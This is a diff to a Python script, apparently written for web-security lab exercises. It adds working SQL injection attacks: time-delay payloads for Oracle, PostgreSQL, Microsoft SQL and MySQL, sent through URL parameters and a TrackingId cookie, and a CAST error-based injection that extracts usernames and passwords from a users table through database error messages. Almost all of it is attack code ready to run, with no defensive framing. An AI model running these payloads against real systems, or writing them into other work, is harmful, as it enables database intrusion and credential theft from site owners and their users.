@@ -1,6 +1,9 @@
+
+from urllib.parse import quote
 import requests
 import difflib
 from bs4 import BeautifulSoup
+import re
 
 session = requests.Session()
 CHAR_LIST = list("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
@@ -99,8 +102,70 @@ def blind_error_inj(lang_pass, username):
             print("Can't find a latter")
             break
 
+def make_payloads(base, delay):
+    return {
+        "Oracle":          f"{base}'||dbms_pipe.receive_message('', {delay})||'",
+        "PostgreSQL":      f"{base}'||(SELECT pg_sleep({delay}))||'",
+        "Microsoft SQL":   f"{base}';WAITFOR DELAY '0:0:{delay}'--",
+        "MySQL/MariaDB":   f"{base}' AND SLEEP({delay})-- ",
+    }
 
+def url_sql_verify(ses, url, delay):
+    baseline = ses.get(url)
+    print(f"Baseline status: {baseline.status_code}, length: {len(baseline.text)}")
 
+    for db, payload in make_payloads("", delay).items():
+        test_url = url + quote(payload, safe='')
+        try:
+            response = ses.get(test_url, timeout=delay+5)
+            elapsed = response.elapsed.total_seconds()
+            print(f"{db}: Status code: {response.status_code}, length: {len(response.text)}, time elapsed: {elapsed}")
+        except Exception as e:
+            print(f"{db}: request failed ({e})")
+
+def cookie_sql_verify(ses, url, delay):
+    resp = ses.get(url)
+    tracking_id = resp.cookies.get("TrackingId")
+    session_id = resp.cookies.get("session")
+
+    if tracking_id is None:
+        print("Tracking ID not found")
+        return
+
+    for db, payload in make_payloads(tracking_id, delay).items():
+        cookies_injection = {
+            "TrackingId": payload,
+            "session": session_id
+        }
+        try:
+            response = ses.get(url, cookies=cookies_injection, timeout=delay+5)
+            elapsed = response.elapsed.total_seconds()
+            print(f"{db}: Status code: {response.status_code}, length: {len(response.text)}, time elapsed: {elapsed}")
+        except Exception as e:
+            print(f"{db}: request failed ({e})")
+
+def cast_inj():
+
+    payload_login = "'AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--"
+    payload_pass = "'AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--"
+    c = (payload_pass, payload_login)
+
+    for i in c:
+        cookies = {
+            "TrackingId": i
+        }
+        response = session.get(base_url, cookies=cookies)
+
+        match = re.search(r'invalid input syntax for type integer: "(.*?)"', response.text)
+
+        if match:
+            print(f"We found {match.group(1)}")
+        else:
+            print(f"Nothing found, check the payload or server response")
+            print(response.text[:1000])
+
+# def delay_based_inj(lang_pass, username):
+#     url_response = session.get(base_url)
 
 if __name__ == "__main__":
-    payload_inj(20, "administrator")
+    cookie_sql_verify(session, base_url, 5)
